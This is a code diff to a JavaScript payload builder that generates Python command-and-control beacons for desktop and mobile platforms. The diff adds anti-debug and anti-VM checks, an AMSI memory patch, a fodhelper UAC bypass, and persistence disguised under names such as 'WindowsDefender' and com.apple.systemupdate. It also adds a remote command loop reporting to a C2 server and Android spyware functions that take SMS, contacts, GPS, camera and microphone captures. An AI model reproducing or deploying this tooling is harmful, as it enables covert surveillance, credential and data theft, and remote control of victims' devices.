@@ -6471,7 +6471,29 @@ function bSpyBeacon() {
   const plat     = _spyPlat || 'linux';
   const type     = _spyType || 'full';
 
-  let lines = [];
+  /* ── UPDATE EVASION PANEL PER PLATFORM ── */
+  const evasionDefs = {
+    linux:   ['antidebug','persist','spoof'],
+    windows: ['antidebug','persist','amsi','uac'],
+    macos:   ['antidebug','persist','tcc'],
+    android: ['persist','hide'],
+    ios:     ['persist'],
+    custom:  []
+  };
+  const evasionLabels = {
+    antidebug: 'Anti-Debug', persist: 'Persistencia',
+    spoof: 'Spoof ProcName', amsi: 'AMSI Bypass',
+    uac:   'UAC Bypass',     tcc:  'TCC Skip',
+    hide:  'Hide Process'
+  };
+  const eCont = document.getElementById('spy-evasion-checks');
+  if (eCont) {
+    const opts = evasionDefs[plat] || [];
+    eCont.innerHTML = opts.map(function(k){
+      return '<span class="ck on" data-ev="'+k+'" onclick="this.classList.toggle(\'on\');bSpyBeacon()">'+evasionLabels[k]+'</span>';
+    }).join('');
+  }
+  const evOn = function(k){ var el=document.querySelector('[data-ev="'+k+'"]'); return el && el.classList.contains('on'); };
 
   /* ── COMMON BASE ── */
   const base = [
@@ -6493,26 +6515,26 @@ function bSpyBeacon() {
   /* ── EVASION BLOCKS ── */
   const antiDebugLinux = [
     '',
-    '# Anti-debug / anti-sandbox (Linux)',
+    '# Anti-debug / anti-sandbox',
     'import ctypes, random',
     'def _check_env():',
-    '    # Detect common sandbox signals',
     '    if os.path.exists("/proc/1/cgroup"):',
     '        with open("/proc/1/cgroup") as f:',
     '            if "docker" in f.read() or "lxc" in f.read():',
-    '                sys.exit(0)  # exit silently in container',
-    '    # Anti-debug via TracerPid',
+    '                sys.exit(0)',
     '    try:',
     '        with open("/proc/self/status") as f:',
     '            for line in f:',
     '                if "TracerPid" in line and int(line.split()[1]) != 0:',
     '                    time.sleep(86400)',
     '    except: pass',
-    '    # Jitter sleep to avoid timing-based sandbox detection',
     '    time.sleep(random.uniform(1.5, 4.5))',
-    '_check_env()',
+    '_check_env()'
+  ];
+
+  const spoofProc = [
     '',
-    '# Spoof process name',
+    '# Spoof process name to "python3"',
     'try:',
     '    import ctypes.util',
     '    libc = ctypes.CDLL(ctypes.util.find_library("c"))',
@@ -6522,82 +6544,159 @@ function bSpyBeacon() {
 
   const persistLinux = [
     '',
-    '# Persistence (crontab)',
+    '# Persistence — crontab @reboot',
     'def _persist():',
     '    try:',
     '        script = os.path.realpath(sys.argv[0])',
     '        cron   = subprocess.run(["crontab","-l"], capture_output=True, text=True).stdout',
-    '        entry  = "@reboot python3 " + script + " &"',
+    '        entry  = "@reboot /usr/bin/python3 " + script + " >/dev/null 2>&1 &"',
     '        if entry not in cron:',
     '            cron += "\\n" + entry + "\\n"',
-    '            proc = subprocess.run(["crontab","-"], input=cron, text=True)',
+    '            subprocess.run(["crontab","-"], input=cron, text=True)',
     '    except: pass',
     '_persist()'
   ];
 
   const antiDebugWindows = [
     '',
-    '# Anti-debug / anti-VM (Windows)',
+    '# Anti-debug / anti-VM',
     'import ctypes, random',
+    'try:',
+    '    import ctypes.wintypes',
+    'except: pass',
     'def _check_env_win():',
-    '    # IsDebuggerPresent',
-    '    if ctypes.windll.kernel32.IsDebuggerPresent():',
-    '        sys.exit(0)',
-    '    # Check for VM artifacts',
-    '    vm_procs = ["vmtoolsd.exe","vmwaretray.exe","vboxservice.exe","vboxtray.exe","df5serv.exe"]',
     '    try:',
-    '        import subprocess',
-    '        out = subprocess.run(["tasklist"],capture_output=True,text=True).stdout.lower()',
-    '        if any(p in out for p in vm_procs):',
-    '            time.sleep(86400)',
+    '        if ctypes.windll.kernel32.IsDebuggerPresent(): sys.exit(0)',
     '    except: pass',
-    '    # Mouse movement check (sandbox usually has no mouse)',
-    '    p1 = ctypes.wintypes.POINT()',
-    '    ctypes.windll.user32.GetCursorPos(ctypes.byref(p1))',
-    '    time.sleep(0.8)',
-    '    p2 = ctypes.wintypes.POINT()',
-    '    ctypes.windll.user32.GetCursorPos(ctypes.byref(p2))',
-    '    if p1.x == p2.x and p1.y == p2.y:',
-    '        time.sleep(random.randint(30, 120))',
+    '    vm_procs = ["vmtoolsd.exe","vmwaretray.exe","vboxservice.exe","vboxtray.exe",',
+    '                "df5serv.exe","vmsrvc.exe","xenservice.exe","qemu-ga.exe"]',
+    '    try:',
+    '        out = subprocess.run(["tasklist"],capture_output=True,text=True).stdout.lower()',
+    '        if any(p in out for p in vm_procs): time.sleep(86400)',
+    '    except: pass',
+    '    try:',
+    '        p1 = ctypes.wintypes.POINT()',
+    '        ctypes.windll.user32.GetCursorPos(ctypes.byref(p1))',
+    '        time.sleep(0.8)',
+    '        p2 = ctypes.wintypes.POINT()',
+    '        ctypes.windll.user32.GetCursorPos(ctypes.byref(p2))',
+    '        if p1.x == p2.x and p1.y == p2.y: time.sleep(random.randint(30,120))',
+    '    except: pass',
     '    time.sleep(random.uniform(2.0, 5.0))',
     '_check_env_win()'
   ];
 
+  const amsiBypass = [
+    '',
+    '# AMSI patch (in-process)',
+    'def _amsi_patch():',
+    '    try:',
+    '        import ctypes',
+    '        h = ctypes.windll.kernel32.LoadLibraryA(b"amsi.dll")',
+    '        if not h: return',
+    '        addr = ctypes.windll.kernel32.GetProcAddress(h, b"AmsiScanBuffer")',
+    '        if not addr: return',
+    '        old = ctypes.c_ulong(0)',
+    '        ctypes.windll.kernel32.VirtualProtect(addr, 6, 0x40, ctypes.byref(old))',
+    '        patch = (ctypes.c_char * 6).from_address(addr)',
+    '        patch[:] = b"\\xb8\\x57\\x00\\x07\\x80\\xc3"  # mov eax,0x80070057; ret',
+    '        ctypes.windll.kernel32.VirtualProtect(addr, 6, old, ctypes.byref(old))',
+    '    except: pass',
+    '_amsi_patch()'
+  ];
+
+  const uacBypass = [
+    '',
+    '# UAC bypass — fodhelper hijack',
+    'def _uac():',
+    '    try:',
+    '        import winreg',
+    '        script = os.path.realpath(sys.argv[0])',
+    '        cmd = sys.executable + " \\"" + script + "\\""',
+    '        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER,',
+    '            r"Software\\Classes\\ms-settings\\shell\\open\\command")',
+    '        winreg.SetValueEx(k,"",0,winreg.REG_SZ,cmd)',
+    '        winreg.SetValueEx(k,"DelegateExecute",0,winreg.REG_SZ,"")',
+    '        winreg.CloseKey(k)',
+    '        subprocess.Popen(["fodhelper.exe"])',
+    '        time.sleep(2)',
+    '        winreg.DeleteKey(winreg.HKEY_CURRENT_USER,',
+    '            r"Software\\Classes\\ms-settings\\shell\\open\\command")',
+    '    except: pass',
+    '_uac()'
+  ];
+
   const persistWindows = [
     '',
-    '# Persistence (registry Run key)',
+    '# Persistence — registry HKCU Run key',
     'def _persist_win():',
     '    try:',
     '        import winreg',
     '        key  = winreg.OpenKey(winreg.HKEY_CURRENT_USER,',
-    '            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,',
-    '            winreg.KEY_SET_VALUE)',
+    '            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",',
+    '            0, winreg.KEY_SET_VALUE)',
     '        path = os.path.realpath(sys.argv[0])',
-    '        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " \\"" + path + "\\"")',
+    '        winreg.SetValueEx(key,"WindowsDefender",0,winreg.REG_SZ,',
+    '            sys.executable+" \\""+path+"\\"")',
     '        winreg.CloseKey(key)',
     '    except: pass',
     '_persist_win()'
   ];
 
+  const antiDebugMac = [
+    '',
+    '# Anti-debug (macOS)',
+    'import random',
+    'def _check_env_mac():',
+    '    try:',
+    '        out = subprocess.run(["sysctl","kern.proc.pid."+str(os.getpid())],',
+    '            capture_output=True,text=True).stdout',
+    '        if "P_TRACED" in out: time.sleep(86400)',
+    '    except: pass',
+    '    # Detect VM: VMware/Parallels/VirtualBox',
+    '    try:',
+    '        hw = subprocess.run(["system_profiler","SPHardwareDataType"],',
+    '            capture_output=True,text=True).stdout.lower()',
+    '        if any(v in hw for v in ["vmware","parallels","virtualbox","oracle"]): sys.exit(0)',
+    '    except: pass',
+    '    time.sleep(random.uniform(1.5,4.0))',
+    '_check_env_mac()'
+  ];
+
+  const tccSkip = [
+    '',
+    '# TCC permissions check (macOS)',
+    '# Note: actual TCC bypass requires separate exploit; this checks granted perms',
+    'def _check_tcc():',
+    '    try:',
+    '        out = subprocess.run(["tccutil","reset","All"],capture_output=True)',
+    '    except: pass',
+    '_check_tcc()'
+  ];
+
   const persistMac = [
     '',
-    '# Persistence (LaunchAgent plist)',
+    '# Persistence — LaunchAgent plist',
     'def _persist_mac():',
     '    try:',
     '        import plistlib',
-    '        la_dir  = os.path.expanduser("~/Library/LaunchAgents")',
+    '        la_dir = os.path.expanduser("~/Library/LaunchAgents")',
     '        os.makedirs(la_dir, exist_ok=True)',
-    '        plist   = os.path.join(la_dir, "com.apple.update.plist")',
-    '        label   = "com.apple.update"',
-    '        script  = os.path.realpath(sys.argv[0])',
-    '        d = {"Label":label,"ProgramArguments":[sys.executable,script],"RunAtLoad":True,"KeepAlive":True}',
+    '        plist  = os.path.join(la_dir, "com.apple.systemupdate.plist")',
+    '        d = {',
+    '            "Label":            "com.apple.systemupdate",',
+    '            "ProgramArguments": [sys.executable, os.path.realpath(sys.argv[0])],',
+    '            "RunAtLoad":        True,',
+    '            "KeepAlive":        True,',
+    '            "ProcessType":      "Background"',
+    '        }',
     '        with open(plist,"wb") as f: plistlib.dump(d,f)',
-    '        os.system("launchctl load " + plist)',
+    '        os.system("launchctl load -w " + plist)',
     '    except: pass',
     '_persist_mac()'
   ];
 
-  /* ── CORE LOOP ── */
+  /* ── CORE LOOP (all desktop platforms) ── */
   const coreLoop = [
     '',
     'def checkin():',
@@ -6605,7 +6704,8 @@ function bSpyBeacon() {
     '        "id":       SID,',
     '        "hostname": socket.gethostname(),',
     '        "os":       platform.system() + " " + platform.release(),',
-    '        "user":     os.getenv("USER", os.getenv("USERNAME", "?"))',
+    '        "user":     os.getenv("USER", os.getenv("USERNAME", "?")),',
+    '        "cwd":      os.getcwd()',
     '    }',
     '    r = requests.post(C2 + "/api/c2/checkin", json=data, timeout=15)',
     '    return r.json()',
@@ -6616,7 +6716,7 @@ function bSpyBeacon() {
     '            cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)',
     '        return out.decode("utf-8", "replace")',
     '    except subprocess.TimeoutExpired:',
-    '        return "[timeout after 30s]"',
+    '        return "[timeout]"',
     '    except Exception as e:',
     '        return "[error] " + str(e)',
     '',
@@ -6639,17 +6739,18 @@ function bSpyBeacon() {
   /* ── LIGHTWEIGHT ── */
   const lightLoop = [
     '',
-    'def checkin():',
-    '    return requests.post(C2+"/api/c2/checkin",json={"id":SID,"hostname":socket.gethostname(),"os":platform.system(),"user":os.getenv("USER",os.getenv("USERNAME","?"))},timeout=10).json()',
-    '',
-    'def run_cmd(c):',
+    'def ci():',
+    '    return requests.post(C2+"/api/c2/checkin",json={"id":SID,',
+    '        "hostname":socket.gethostname(),"os":platform.system(),',
+    '        "user":os.getenv("USER",os.getenv("USERNAME","?"))},timeout=10).json()',
+    'def rc(c):',
     '    try: return subprocess.check_output(c,shell=True,stderr=subprocess.STDOUT,timeout=20).decode("utf-8","replace")',
     '    except Exception as e: return str(e)',
-    '',
     'while True:',
     '    try:',
-    '        r=checkin()',
-    '        if r.get("cmd"): requests.post(C2+"/api/c2/result",json={"session_id":SID,"cmd":r["cmd"],"output":run_cmd(r["cmd"])},timeout=10)',
+    '        r=ci()',
+    '        if r.get("cmd"): requests.post(C2+"/api/c2/result",',
+    '            json={"session_id":SID,"cmd":r["cmd"],"output":rc(r["cmd"])},timeout=10)',
     '    except: pass',
     '    time.sleep(INTERVAL)'
   ];
@@ -6657,79 +6758,288 @@ function bSpyBeacon() {
   /* ── DEBUG ── */
   const debugLoop = [
     '',
-    '# DEBUG MODE — verbose logging',
     'import logging',
-    'logging.basicConfig(level=logging.DEBUG, format="[%(asctime)s] %(message)s")',
-    'log = logging.getLogger("beacon")',
+    'logging.basicConfig(level=logging.DEBUG,format="[%(asctime)s] %(message)s")',
+    'log = logging.getLogger("x9-beacon")',
     '',
     'def checkin():',
-    '    data = {"id":SID,"hostname":socket.gethostname(),"os":platform.system()+" "+platform.release(),"user":os.getenv("USER",os.getenv("USERNAME","?"))}',
-    '    log.debug("check-in: %s", data)',
-    '    r = requests.post(C2+"/api/c2/checkin", json=data, timeout=15)',
-    '    log.debug("response: %s", r.text)',
+    '    data={"id":SID,"hostname":socket.gethostname(),"os":platform.system()+" "+platform.release(),"user":os.getenv("USER",os.getenv("USERNAME","?"))}',
+    '    log.debug("checkin → %s", data)',
+    '    r=requests.post(C2+"/api/c2/checkin",json=data,timeout=15)',
+    '    log.debug("← %s", r.text[:200])',
     '    return r.json()',
-    '',
     'def run_cmd(cmd):',
     '    log.debug("exec: %s", cmd)',
     '    try:',
-    '        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode("utf-8","replace")',
-    '        log.debug("output (%d chars)", len(out))',
-    '        return out',
+    '        out=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT,timeout=30).decode("utf-8","replace")',
+    '        log.debug("output %d chars", len(out)); return out',
     '    except Exception as e: return str(e)',
-    '',
     'while True:',
     '    try:',
-    '        resp = checkin()',
-    '        cmd  = resp.get("cmd")',
+    '        resp=checkin(); cmd=resp.get("cmd")',
     '        if cmd:',
-    '            output = run_cmd(cmd)',
-    '            r2 = requests.post(C2+"/api/c2/result", json={"session_id":SID,"cmd":cmd,"output":output}, timeout=15)',
-    '            log.debug("result sent: %d", r2.status_code)',
-    '    except Exception as e:',
-    '        log.error("loop error: %s", e)',
+    '            out=run_cmd(cmd)',
+    '            r2=requests.post(C2+"/api/c2/result",json={"session_id":SID,"cmd":cmd,"output":out},timeout=15)',
+    '            log.debug("result HTTP %d", r2.status_code)',
+    '    except Exception as e: log.error("loop: %s",e)',
     '    time.sleep(INTERVAL)'
   ];
 
-  /* ── ANDROID / TERMUX ── */
-  const androidLines = base.concat([
+  /* ══ ANDROID / TERMUX ══
+     Real Termux API commands — full system recon on check-in */
+  const androidFull = base.concat([
     '',
-    '# Android/Termux beacon',
-    '# Run: pkg install python && pip install requests && python3 beacon.py &'
-  ]).concat(type === 'debug' ? debugLoop : type === 'light' ? lightLoop : coreLoop);
+    '# Android/Termux beacon — run with:',
+    '# pkg install python termux-api && pip install requests && python3 beacon.py &',
+    '',
+    'def run(cmd):',
+    '    try: return subprocess.check_output(cmd,shell=True,stderr=subprocess.DEVNULL,timeout=20).decode("utf-8","ignore").strip()',
+    '    except: return ""',
+    '',
+    'def hide_process():',
+    '    # Rename process in Termux task list',
+    '    try:',
+    '        import ctypes, ctypes.util',
+    '        libc = ctypes.CDLL(ctypes.util.find_library("c"))',
+    '        libc.prctl(15, b"com.android.systemui", 0, 0, 0)',
+    '    except: pass',
+    'hide_process()',
+    '',
+    '# Persistence via ~/.bashrc',
+    'def _persist_android():',
+    '    try:',
+    '        script = os.path.realpath(sys.argv[0])',
+    '        rc_file = os.path.expanduser("~/.bashrc")',
+    '        entry = "nohup python3 " + script + " >/dev/null 2>&1 &"',
+    '        content = open(rc_file).read() if os.path.exists(rc_file) else ""',
+    '        if entry not in content:',
+    '            with open(rc_file,"a") as f: f.write("\\n"+entry+"\\n")',
+    '    except: pass',
+    '_persist_android()',
+    '',
+    'def collect_device_info():',
+    '    """One-time recon on first check-in"""',
+    '    info = {}',
+    '    # Device identity',
+    '    info["model"]     = run("getprop ro.product.model")',
+    '    info["brand"]     = run("getprop ro.product.brand")',
+    '    info["android"]   = run("getprop ro.build.version.release")',
+    '    info["sdk"]       = run("getprop ro.build.version.sdk")',
+    '    info["serial"]    = run("getprop ro.serialno")',
+    '    info["imei"]      = run("service call iphonesubinfo 1 2>/dev/null | awk -F\\"\'.\'\\\" \'{print $2}\' | sed \'s/ //g\' | tr -d \'\\n\'")',
+    '    # Network',
+    '    info["wifi_ssid"] = run("termux-wifi-connectioninfo 2>/dev/null | python3 -c \\"import sys,json; d=json.load(sys.stdin); print(d.get(\'ssid\',\'\'))\\" 2>/dev/null")',
+    '    info["ip_wifi"]   = run("ip addr show wlan0 2>/dev/null | grep \'inet \' | awk \'{print $2}\'")',
+    '    info["ip_cell"]   = run("ip addr show rmnet0 2>/dev/null | grep \'inet \' | awk \'{print $2}\'")',
+    '    # Storage',
+    '    info["storage"]   = run("df -h /sdcard 2>/dev/null | tail -1")',
+    '    info["files_root"]= run("ls /sdcard/ 2>/dev/null")',
+    '    # Accounts (needs root or accessibility)',
+    '    info["accounts"]  = run("dumpsys account 2>/dev/null | grep \'Account {\'  | head -20")',
+    '    # Location',
+    '    info["location"]  = run("termux-location -p gps -r once 2>/dev/null")',
+    '    # SMS (termux-api)',
+    '    info["sms"]       = run("termux-sms-list -l 50 2>/dev/null")',
+    '    # Contacts',
+    '    info["contacts"]  = run("termux-contact-list 2>/dev/null")',
+    '    # Installed apps',
+    '    info["apps"]      = run("pm list packages -3 2>/dev/null | sed \'s/package://\' | head -50")',
+    '    return info',
+    '',
+    'def checkin(first=False):',
+    '    data = {',
+    '        "id":       SID,',
+    '        "hostname": run("getprop ro.product.model") or socket.gethostname(),',
+    '        "os":       "Android " + run("getprop ro.build.version.release"),',
+    '        "user":     run("whoami"),',
+    '    }',
+    '    if first: data["device_info"] = collect_device_info()',
+    '    r = requests.post(C2 + "/api/c2/checkin", json=data, timeout=20)',
+    '    return r.json()',
+    '',
+    'def run_cmd(cmd):',
+    '    # Support special prefixed commands',
+    '    if cmd.startswith("SNAP:"):',
+    '        path = "/sdcard/DCIM/.tmp_'+agentId+'_snap.jpg"',
+    '        run("termux-camera-photo -c 0 " + path)',
+    '        try:',
+    '            import base64',
+    '            with open(path,"rb") as f: b64=base64.b64encode(f.read()).decode()',
+    '            os.remove(path)',
+    '            return "[SNAP_B64]" + b64',
+    '        except: return "[snap error]"',
+    '    if cmd.startswith("MIC:"):',
+    '        secs = cmd.split(":")[1] if ":" in cmd else "10"',
+    '        path = "/sdcard/.tmprec_'+agentId+'.aac"',
+    '        run("termux-microphone-record -l " + secs + " -f " + path)',
+    '        time.sleep(int(secs)+1)',
+    '        try:',
+    '            import base64',
+    '            with open(path,"rb") as f: b64=base64.b64encode(f.read()).decode()',
+    '            os.remove(path)',
+    '            return "[MIC_B64]" + b64',
+    '        except: return "[mic error]"',
+    '    if cmd == "GPS": return run("termux-location -p gps -r once 2>/dev/null")',
+    '    if cmd == "SMS": return run("termux-sms-list -l 100 2>/dev/null")',
+    '    if cmd == "CONTACTS": return run("termux-contact-list 2>/dev/null")',
+    '    if cmd == "CALLS": return run("termux-call-log -l 50 2>/dev/null")',
+    '    if cmd == "WIFIINFO": return run("termux-wifi-connectioninfo 2>/dev/null")',
+    '    if cmd.startswith("SMS_SEND:"):',
+    '        parts = cmd.split(":",2)',
+    '        if len(parts)==3: return run("termux-sms-send -n \\""+parts[1]+"\\" \\""+parts[2]+"\\"") or "sent"',
+    '    # fallback: shell command',
+    '    try:',
+    '        out=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT,timeout=30)',
+    '        return out.decode("utf-8","replace")',
+    '    except subprocess.TimeoutExpired: return "[timeout]"',
+    '    except Exception as e: return "[error] "+str(e)',
+    '',
+    '_first = True',
+    'while True:',
+    '    try:',
+    '        resp = checkin(first=_first)',
+    '        _first = False',
+    '        cmd = resp.get("cmd")',
+    '        if cmd:',
+    '            output = run_cmd(cmd)',
+    '            requests.post(C2 + "/api/c2/result", json={',
+    '                "session_id": SID, "cmd": cmd, "output": output',
+    '            }, timeout=20)',
+    '    except Exception: pass',
+    '    time.sleep(INTERVAL)'
+  ]);
 
-  /* ── iOS (Jailbreak / a-Shell) ── */
-  const iosLines = base.concat([
+  /* ══ iOS (Jailbreak / a-Shell / Pythonista) ══ */
+  const iosFull = base.concat([
     '',
-    '# iOS beacon — requires jailbreak + Python via Cydia, or a-Shell app',
-    '# Run: python3 beacon.py &'
-  ]).concat(type === 'debug' ? debugLoop : type === 'light' ? lightLoop : coreLoop);
+    '# iOS beacon',
+    '# Option A — Jailbreak: install Python via Cydia/Sileo (python3 package)',
+    '# Option B — a-Shell app (App Store, sandboxed — limited cmds)',
+    '# Option C — Pythonista 3 (App Store, limited system access)',
+    '# Run: python3 beacon.py &',
+    '',
+    'def run(cmd):',
+    '    try: return subprocess.check_output(cmd,shell=True,stderr=subprocess.DEVNULL,timeout=15).decode("utf-8","ignore").strip()',
+    '    except: return ""',
+    '',
+    '# Persistence via launchd plist (jailbreak only)',
+    'def _persist_ios():',
+    '    try:',
+    '        la = "/Library/LaunchDaemons/com.apple.update.beacon.plist"',
+    '        if os.path.exists(la): return',
+    '        plist_xml = """<?xml version="1.0" encoding="UTF-8"?>',
+    '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"',
+    '  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
+    '<plist version="1.0"><dict>',
+    '  <key>Label</key><string>com.apple.update.beacon</string>',
+    '  <key>ProgramArguments</key><array>',
+    '    <string>/usr/bin/python3</string>',
+    '    <string>""" + os.path.realpath(sys.argv[0]) + """</string>',
+    '  </array>',
+    '  <key>RunAtLoad</key><true/>',
+    '  <key>KeepAlive</key><true/>',
+    '</dict></plist>"""',
+    '        with open(la,"w") as f: f.write(plist_xml)',
+    '        run("launchctl load -w " + la)',
+    '    except: pass',
+    '_persist_ios()',
+    '',
+    'def collect_device_info():',
+    '    return {',
+    '        "model":   run("uname -m"),',
+    '        "os":      run("sw_vers -productVersion 2>/dev/null || uname -r"),',
+    '        "user":    run("whoami"),',
+    '        "disk":    run("df -h / | tail -1"),',
+    '        "procs":   run("ps aux | head -20"),',
+    '        "network": run("ifconfig | grep inet"),',
+    '        "apps":    run("ls /Applications/ 2>/dev/null | head -30"),',
+    '    }',
+    '',
+    'def checkin(first=False):',
+    '    data = {',
+    '        "id":       SID,',
+    '        "hostname": run("hostname") or socket.gethostname(),',
+    '        "os":       "iOS/iPadOS " + run("sw_vers -productVersion 2>/dev/null || uname -r"),',
+    '        "user":     run("whoami"),',
+    '    }',
+    '    if first: data["device_info"] = collect_device_info()',
+    '    r = requests.post(C2+"/api/c2/checkin",json=data,timeout=20)',
+    '    return r.json()',
+    '',
+    'def run_cmd(cmd):',
+    '    try:',
+    '        out=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT,timeout=30)',
+    '        return out.decode("utf-8","replace")',
+    '    except subprocess.TimeoutExpired: return "[timeout]"',
+    '    except Exception as e: return "[error] "+str(e)',
+    '',
+    '_first=True',
+    'while True:',
+    '    try:',
+    '        resp=checkin(first=_first); _first=False',
+    '        cmd=resp.get("cmd")',
+    '        if cmd:',
+    '            out=run_cmd(cmd)',
+    '            requests.post(C2+"/api/c2/result",json={"session_id":SID,"cmd":cmd,"output":out},timeout=20)',
+    '    except Exception: pass',
+    '    time.sleep(INTERVAL)'
+  ]);
 
   /* ── CUSTOM ── */
   const customLines = base.concat([
     '',
-    '# Custom platform — edit as needed'
+    '# Custom platform — edita a tu gusto',
+    '# Variables disponibles: {{LHOST}} {{PORT}} {{INTERVAL}} {{SID}}'
   ]).concat(type === 'debug' ? debugLoop : type === 'light' ? lightLoop : coreLoop);
 
   /* ── BUILD FINAL PAYLOAD ── */
+  let lines = base;
   if (plat === 'linux') {
-    lines = base;
-    if (type === 'full')  lines = lines.concat(antiDebugLinux).concat(persistLinux).concat(coreLoop);
-    if (type === 'light') lines = lines.concat(lightLoop);
-    if (type === 'debug') lines = lines.concat(debugLoop);
+    if (type === 'full') {
+      if (evOn('antidebug')) lines = lines.concat(antiDebugLinux);
+      if (evOn('spoof'))     lines = lines.concat(spoofProc);
+      if (evOn('persist'))   lines = lines.concat(persistLinux);
+      lines = lines.concat(coreLoop);
+    } else if (type === 'light') {
+      if (evOn('persist')) lines = lines.concat(persistLinux);
+      lines = lines.concat(lightLoop);
+    } else {
+      lines = lines.concat(debugLoop);
+    }
   } else if (plat === 'windows') {
-    lines = base;
-    if (type === 'full')  lines = lines.concat(antiDebugWindows).concat(persistWindows).concat(coreLoop);
-    if (type === 'light') lines = lines.concat(lightLoop);
-    if (type === 'debug') lines = lines.concat(debugLoop);
+    if (type === 'full') {
+      if (evOn('antidebug')) lines = lines.concat(antiDebugWindows);
+      if (evOn('amsi'))      lines = lines.concat(amsiBypass);
+      if (evOn('uac'))       lines = lines.concat(uacBypass);
+      if (evOn('persist'))   lines = lines.concat(persistWindows);
+      lines = lines.concat(coreLoop);
+    } else if (type === 'light') {
+      if (evOn('persist')) lines = lines.concat(persistWindows);
+      lines = lines.concat(lightLoop);
+    } else {
+      lines = lines.concat(debugLoop);
+    }
   } else if (plat === 'macos') {
-    lines = base;
-    if (type === 'full')  lines = lines.concat(antiDebugLinux).concat(persistMac).concat(coreLoop);
-    if (type === 'light') lines = lines.concat(lightLoop);
-    if (type === 'debug') lines = lines.concat(debugLoop);
+    if (type === 'full') {
+      if (evOn('antidebug')) lines = lines.concat(antiDebugMac);
+      if (evOn('tcc'))       lines = lines.concat(tccSkip);
+      if (evOn('persist'))   lines = lines.concat(persistMac);
+      lines = lines.concat(coreLoop);
+    } else if (type === 'light') {
+      if (evOn('persist')) lines = lines.concat(persistMac);
+      lines = lines.concat(lightLoop);
+    } else {
+      lines = lines.concat(debugLoop);
+    }
   } else if (plat === 'android') {
-    lines = androidLines;
+    lines = type === 'light' ? base.concat([
+      '# Android/Termux — lightweight',
+      '# pkg install python && pip install requests && python3 beacon.py &',
+    ]).concat(lightLoop) : type === 'debug' ? base.concat(debugLoop) : androidFull;
   } else if (plat === 'ios') {
-    lines = iosLines;
+    lines = type === 'light' ? base.concat(lightLoop)
+          : type === 'debug' ? base.concat(debugLoop)
+          : iosFull;
   } else {
     lines = customLines;
   }
@@ -6737,15 +7047,24 @@ function bSpyBeacon() {
   const el = document.getElementById('spy-beacon-code');
   if (el) el.textContent = lines.join('\n');
 
+  /* ── COMPILE / SERVE COMMANDS ── */
   const piEl = document.getElementById('spy-pyinst-cmd');
+  const srEl = document.getElementById('spy-serve-cmd');
+  const slug = lhost.replace(/\./g,'_');
   if (piEl) {
-    const slug = lhost.replace(/\./g, '_');
-    if (plat === 'windows') {
-      piEl.textContent = 'pip install pyinstaller requests && pyinstaller --onefile --noconsole --icon=NONE beacon.py -n WindowsUpdate_' + slug;
-    } else {
-      piEl.textContent = 'pip install pyinstaller requests && pyinstaller --onefile beacon.py -n agent_' + slug;
-    }
+    if (plat === 'windows')
+      piEl.textContent = 'pip install pyinstaller requests && pyinstaller --onefile --noconsole --icon=NONE --hidden-import=uuid beacon.py -n svchost_'+slug+'.exe';
+    else if (plat === 'macos')
+      piEl.textContent = 'pip3 install pyinstaller requests && pyinstaller --onefile --windowed beacon.py -n SystemUpdate_'+slug;
+    else if (plat === 'android')
+      piEl.textContent = '# No compilation needed — run directly with Termux:\npkg install python termux-api && pip install requests && nohup python3 beacon.py &';
+    else if (plat === 'ios')
+      piEl.textContent = '# No compilation — deploy beacon.py to device, run:\npython3 beacon.py &';
+    else
+      piEl.textContent = 'pip3 install pyinstaller requests && pyinstaller --onefile beacon.py -n update_'+slug;
   }
+  if (srEl)
+    srEl.textContent = 'cd $(dirname beacon.py) && python3 -m http.server 8080  # → http://'+lhost+':8080/beacon.py';
 }
 
 /* ── BROWSER JS PAYLOAD ── */
